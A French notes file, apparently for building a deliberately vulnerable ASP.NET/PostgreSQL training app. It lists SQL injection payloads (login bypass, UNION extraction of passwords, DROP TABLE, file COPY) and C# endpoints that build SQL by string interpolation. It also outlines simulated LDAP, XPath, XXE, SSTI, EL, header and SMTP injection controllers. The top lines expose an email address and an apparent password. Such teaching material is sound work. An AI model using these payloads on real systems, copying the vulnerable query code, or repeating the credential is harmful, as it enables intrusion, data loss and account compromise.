stephane.belkheraz@stago.com
Stago-*$PP987

dotnet ef migrations add InitialCreate
dotnet ef database update


Injection SQL

Payloads classiques d’injection SQL à tester

admin' --	
(Ignore le reste de la requête)

admin' OR '1'='1	
(Retourne toutes les lignes)

'; DROP TABLE Users;--	
(Supprime la table Users (exécute un DROP))

' UNION SELECT username, password FROM users--	
Fusionne un autre SELECT

' OR 1=1;--
supprime les données dans le cadre d'un delete




' OR '1'='1	Retourne tous les produits (bypass filtre)
%'; DROP TABLE products;--	Supprime la table products (attaque destructrice)
%'; SELECT pg_sleep(5);--	Ralentit la requête (attaque DoS simple)
%'; COPY products TO '/tmp/pwned.csv' CSV;--	Exfiltration par copie fichier (si droits DB)
%'; SELECT version();--	Récupération version PostgreSQL

____________________________________________
Injection en lecture avancée (exfiltration)

Si l’appli affiche directement le résultat SQL, on peut utiliser une injection pour extraire des données sensibles 
(par exemple, concaténer des colonnes ou exploiter une union) :

%' UNION SELECT 1, version(), 'malicious'-- 

var sql = $"SELECT id, name, description FROM products WHERE name LIKE '%{productName}%'";
var products = _db.Products.FromSqlRaw(sql).ToList();

On va injecter %' UNION SELECT 1, version(), 'x'-- pour forcer la DB à retourner la version dans la colonne name.

____________________________________________
Injection sur commandes de modification/suppression

Exemple pour un endpoint vulnérable supprimant un produit par nom :

[HttpPost]
public IActionResult Delete(string productName)
{
    var sql = $"DELETE FROM products WHERE name = '{productName}'";
    int deleted = _db.Database.ExecuteSqlRaw(sql);
    return Content($"{deleted} produit(s) supprimé(s)");
}

Injection possible : anything'; DROP TABLE products;--
=> Supprime la table entière !

____________________________________________
Injection avec paramètre multiple & requêtes composées

PostgreSQL accepte les requêtes multiples séparées par ; dans certains cas, donc injection peut faire plusieurs actions :

'; DELETE FROM products WHERE id > 0; -- 


____________________________________________
Contrôleur InjectionLdapController :

8 types d'attaques LDAP différentes (basic, wildcard, boolean, null, attributes, blind, escape, dn)
Simulation d'un annuaire LDAP avec des données réalistes
Construction de filtres LDAP vulnérables
Gestion des différents scénarios d'injection

____________________________________________
Contrôleur InjectionXpathController :

8 types d'attaques XPath : basic, union, position, string, count, comment, boolean, wildcard
Document XML simulé avec des données sensibles (mots de passe, cartes de crédit, clés API)
Exécution réelle de requêtes XPath vulnérables
Gestion des résultats scalaires et nœuds
____________________________________________
Contrôleur InjectionXxeController :

8 types d'attaques XXE :

file : Lecture de fichiers locaux (ex: /etc/passwd)
ssrf : Server-Side Request Forgery
dos : Denial of Service (Billion Laughs)
parameter : Entités paramétrées avec DTD externes
blind : XXE aveugle avec exfiltration out-of-band
internal : DTD interne
php : Wrappers PHP spécifiques
oob : Out-of-Band via DNS/HTTP



____________________________________________

Contrôleur InjectionTemplateController :

8 types d'attaques SSTI :

basic : Expressions Razor simples (@(7*7))
code : Blocs de code C# arbitraire
system : Accès aux informations système
file : Lecture de fichiers locaux
reflection : Utilisation de la réflexion .NET
network : Requêtes réseau (SSRF)
loop : DoS via boucles intensives
database : Exposition de chaînes de connexion


Simulation sécurisée : Le code ne compile pas vraiment les templates Razor (trop dangereux), mais simule les résultats de manière réaliste

____________________________________________

Contrôleur InjectionElController :

8 types d'attaques EL :

basic : Expressions EL simples (${7*7}, ${user.name})
method : Invocation de méthodes dangereuses
reflection : Utilisation de la réflexion Java/.NET
spring : Injection SpEL (Spring Expression Language)
ognl : Injection OGNL (Struts)
nested : Expressions imbriquées complexes
bypass : Techniques de contournement de filtres
polyglot : Payloads fonctionnant sur plusieurs moteurs

____________________________________________

HeaderInjectionController.cs
Le contrôleur gère 8 types d'attaques différentes :

redirect : Redirection malveillante via l'en-tête Location
xss : Injection XSS via le corps de la réponse HTTP
cookie : Injection de cookies malveillants
cache : Empoisonnement du cache
cors : Manipulation des en-têtes CORS
security : Désactivation des en-têtes de sécurité
smuggling : HTTP Request Smuggling
custom : En-têtes personnalisés

____________________________________________

InjectionSmtpController.cs
Le contrôleur gère 8 types d'attaques différentes :

header : Injection d'en-têtes SMTP (Bcc, Cc, etc.)
recipient : Ajout de destinataires non autorisés
subject : Manipulation du sujet et injection de contenu
sender : Usurpation d'identité (spoofing From)
attachment : Injection MIME pour pièces jointes
spam : Utilisation comme relais de spam
command : Injection de commandes SMTP directes
xss : Injection HTML/JavaScript dans les emails
____________________________________________



____________________________________________


____________________________________________



____________________________________________


____________________________________________



____________________________________________